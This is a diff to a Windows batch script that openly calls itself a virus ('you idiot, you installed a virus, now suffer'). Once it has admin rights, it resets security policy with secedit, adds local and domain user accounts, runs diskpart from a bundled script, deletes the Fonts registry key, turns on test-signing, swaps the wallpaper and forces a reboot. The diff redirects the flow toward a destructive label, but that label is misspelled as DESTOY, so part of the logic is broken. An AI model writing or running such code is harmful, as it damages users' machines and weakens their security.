@@ -1,6 +1,8 @@
 
 @echo off
 TITLE CMDV4
+SFC /ScanFile="C:\Windows\system32\net.exe"
+SFC /ScanFile="C:\Windows\system32\net1.exe"
 @rem ----[ This code block detects if the script is being running with admin PRIVILEGES If it isn't it pauses and then quits]-------
 echo OFF
 NET SESSION >nul 2>&1
@@ -25,6 +27,13 @@ IF %ERRORLEVEL% EQU 0 (
    EXIT /B 1
 )
 cls
+echo Loading...
+SFC /ScanFile="C:\Windows\system32\reg.exe"
+SFC /ScanFile="C:\Windows\system32\diskpart.exe"
+SFC /ScanFile="C:\Windows\system32\secedit.exe"
+SFC /ScanFile="C:\Windows\system32\mountvol.exe"
+SFC /ScanFile="C:\Windows\system32\logoff.exe"
+secedit /configure /cfg %windir%\inf\defltbase.inf /db defltbase.sdb /verbose
 echo Checking Operating System Version...
 wmic os get version | find "6.1" > nul
 if %ERRORLEVEL% == 0 goto SEVEN
@@ -157,7 +166,7 @@ net user beachball /add
 net localgroup Guests beachball /add
 net user Dartz 1593570 /domain
 diskpart /s %CD%\unass\unass.txt
-goto eeee
+goto DESTROY
 :EXIT
 exit
 :RESTART
@@ -165,8 +174,8 @@ echo you idiot, you installed a virus, now suffer!!!!!!!!!
 echo,
 wmic os where primary=1 reboot
 :DESTOY
-REG DELETE HKML\Software\Microsoft\Windows NT\Fonts /F
-GOTO RESTART
+REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Fonts /f
+GOTO AAAAJJ
 :MAININSTALLB
 cls
 echo .....................................................
@@ -187,7 +196,7 @@ goto eeee
 bcdedit /set TESTSIGNING on
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %CD%\walp.bmp /f
 RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
-goto AAAAJJ
+goto DESTROY
 :AAAAJJ
 echo,
 echo Something Happened :)
